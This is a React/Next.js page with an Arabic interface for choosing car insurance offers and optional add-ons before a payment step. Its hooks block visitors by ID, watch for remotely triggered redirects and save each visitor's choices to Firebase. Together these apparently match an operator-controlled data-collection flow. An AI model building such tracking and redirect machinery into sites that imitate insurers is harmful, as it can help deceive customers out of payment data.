"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Globe, CheckCircle2 } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { StepShell } from "@/components/step-shell"
import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { addData } from "@/lib/firebase"
import { offerData } from "@/lib/offer-data"

export default function ComparisonPage() {
  const router = useRouter()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)
  
  const [selectedOffer, setSelectedOffer] = useState<any>(null)
  const [selectedFeatures, setSelectedFeatures] = useState<Record<string, string[]>>({})
  const [offerTotalPrice, setOfferTotalPrice] = useState<number>(0)
  const [offersTab, setOffersTab] = useState<"comprehensive" | "against-others">("against-others")
  
  const [language, setLanguage] = useState<"ar" | "en">("ar")
  
  useAutoSave({
    visitorId: visitorID,
    pageName: "compar",
    data: {
      selectedOffer: selectedOffer?.company?.name || "",
      selectedFeatures,
      offerTotalPrice
    }
  })
  
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "compar"
  })
  
  useEffect(() => {
    const init = async () => {
      const blocked = await checkIfBlocked(visitorID)
      if (blocked) {
        setIsBlocked(true)
        setLoading(false)
        return
      }
      setLoading(false)
    }
    init()
  }, [visitorID])
  
  const toggleFeature = (offerId: string, featureId: string) => {
    setSelectedFeatures((prev) => {
      const current = prev[offerId] || []
      if (current.includes(featureId)) {
        return { ...prev, [offerId]: current.filter((id) => id !== featureId) }
      } else {
        return { ...prev, [offerId]: [...current, featureId] }
      }
    })
  }
  
  const calculateOfferTotal = (offer: (typeof offerData)[0], selectedFeatures: string[] = []) => {
    const mainPrice = Number.parseFloat(offer.main_price)
    const featuresPrice = offer.extra_features
      .filter((f) => selectedFeatures.includes(f.id))
      .reduce((sum, f) => sum + f.price, 0)
    const expensesTotal = offer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
    return mainPrice + featuresPrice + expensesTotal
  }
  
  const filteredOffers = offerData.filter((offer) => offer.type === offersTab)
  
  const handleSelectOffer = async (offer: (typeof offerData)[0]) => {
    setSelectedOffer(offer)
    const selectedOfferFeatures = selectedFeatures[offer.id] || []
    const totalPrice = calculateOfferTotal(offer, selectedOfferFeatures)
    const finalPrice = Number.parseFloat(totalPrice.toFixed(2))
    setOfferTotalPrice(finalPrice)
    
    await addData({ 
      id: visitorID, 
      selectedOffer: {
        name: offer.company.name,
        image_url: offer.company.image_url,
        type: offer.type,
        extra_features: offer.extra_features.filter(f => selectedOfferFeatures.includes(f.id))
      },
      offerTotalPrice: finalPrice,
      selectedFeatures: selectedOfferFeatures,
      currentStep: 4,
      currentPage: "check",
      comparCompletedAt: new Date().toISOString()
    }).then(() => {
      router.push('/check')
    })
  }
  
  if (loading) return <FullPageLoader />
  
  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    )
  }
  
  return (
    <StepShell
      step={2}
      title="العروض المتاحة"
      subtitle="اختر العرض الأنسب لك قبل الانتقال إلى الدفع."
      maxWidthClassName="max-w-2xl"
      headerAction={
        <button 
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-2 rounded-lg border border-[#bbdefb] bg-[#e3f2fd] px-3 py-2 text-sm font-bold text-[#1976d2]"
        >
          <Globe className="h-4 w-4 text-[#1976d2]" />
          <span>{language === "ar" ? "EN" : "AR"}</span>
        </button>
      }
    >
      {/* Bank Notice */}
      <div className="mb-4" dir="rtl">
        <div className="bg-blue-50 border border-blue-200 rounded-xl p-3 text-blue-900 text-xs leading-relaxed">
          بموجب تعليمات البنك المركزي السعودي، يحق لحامل الوثيقة إلغاء الوثيقة واسترداد كامل المبلغ المدفوع خلال
          15 يوماً من تاريخ الشراء، بشرط عدم حدوث أي مطالبات خلال هذه الفترة.
        </div>
      </div>

      {/* Tabs */}
      <div className="mb-5" dir="rtl">
        <div className="flex gap-2 bg-gray-100 p-1 rounded-xl">
          <button
            onClick={() => setOffersTab("against-others")}
            className={`flex-1 py-2.5 rounded-lg font-bold text-sm transition-all ${
              offersTab === "against-others"
                ? "bg-[#1976d2] text-white shadow"
                : "text-gray-500 hover:text-gray-700"
            }`}
          >
            تأمين ضد الغير
          </button>
          <button
            onClick={() => setOffersTab("comprehensive")}
            className={`flex-1 py-2.5 rounded-lg font-bold text-sm transition-all ${
              offersTab === "comprehensive"
                ? "bg-[#1976d2] text-white shadow"
                : "text-gray-500 hover:text-gray-700"
            }`}
          >
            تأمين شامل
          </button>
        </div>
      </div>

      {/* Offers List */}
      <div className="space-y-4">
        {filteredOffers.map((offer) => {
          const offerSelectedFeatures = selectedFeatures[offer.id] || []
          const totalPrice = calculateOfferTotal(offer, offerSelectedFeatures)

          return (
            <div
              key={offer.id}
              className="bg-white rounded-2xl shadow-md border border-gray-100 overflow-hidden"
              dir="rtl"
            >
              {/* Card Header */}
              <div className="flex items-start justify-between p-4 pb-3 border-b border-gray-100">
                <div>
                  <h3 className="text-base font-bold text-gray-900 mb-0.5">{offer.company.name}</h3>
                  <span className="text-[#1976d2] text-sm font-semibold">
                    التأمين {offer.type === "against-others" ? "ضد الغير" : "الشامل"}
                  </span>
                </div>
                <div className="w-14 h-14 rounded-xl border border-gray-200 bg-gray-50 flex items-center justify-center overflow-hidden flex-shrink-0">
                  <img
                    src={offer.company.image_url || "/placeholder.svg"}
                    alt={offer.company.name}
                    className="w-full h-full object-contain p-1"
                  />
                </div>
              </div>

              {/* Price Row */}
              <div className="flex items-center justify-between px-4 py-3 bg-gray-50">
                <span className="text-xs text-gray-500">السعر السنوي</span>
                <div className="flex items-baseline gap-1">
                  <span className="text-2xl font-bold text-[#1976d2]">{totalPrice.toFixed(2)}</span>
                  <span className="text-xs text-gray-500">﷼ / سنة</span>
                </div>
              </div>

              {/* Extra Features (checkboxes) */}
              {offer.extra_features.length > 0 && (
                <div className="px-4 pt-3 pb-2">
                  <p className="text-xs text-gray-400 font-semibold mb-2">إضافات اختيارية</p>
                  <div className="space-y-2">
                    {offer.extra_features.map((feature) => (
                      <label
                        key={feature.id}
                        htmlFor={`${offer.id}-${feature.id}`}
                        className="flex items-start gap-2.5 cursor-pointer group"
                      >
                        <input
                          type="checkbox"
                          id={`${offer.id}-${feature.id}`}
                          checked={offerSelectedFeatures.includes(feature.id)}
                          onChange={() => toggleFeature(offer.id, feature.id)}
                          className="mt-0.5 w-4 h-4 accent-[#1976d2] rounded"
                        />
                        <span className="flex-1 text-gray-700 text-xs leading-relaxed">
                          {feature.content}
                          {feature.price > 0 && (
                            <span className="text-[#1976d2] font-semibold mr-1">(+{feature.price} ﷼)</span>
                          )}
                        </span>
                      </label>
                    ))}
                  </div>
                </div>
              )}

              {/* Extra Expenses */}
              {offer.extra_expenses.length > 0 && (
                <div className="px-4 pt-2 pb-3 border-t border-dashed border-gray-200 mt-2">
                  <p className="text-xs text-gray-400 font-semibold mb-1.5">رسوم إضافية</p>
                  {offer.extra_expenses.map((expense) => (
                    <div key={expense.id} className="flex justify-between items-center text-xs text-gray-600 py-0.5">
                      <span className="text-[#1976d2] font-medium">{expense.price} ﷼</span>
                      <span>{expense.reason}</span>
                    </div>
                  ))}
                </div>
              )}

              {/* Select Button */}
              <div className="px-4 pb-4 pt-2">
                <Button
                  onClick={() => handleSelectOffer(offer)}
                  className="w-full h-11 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-base rounded-xl shadow transition-all"
                >
                  اختيار
                </Button>
              </div>
            </div>
          )
        })}
      </div>
    </StepShell>
  )
}
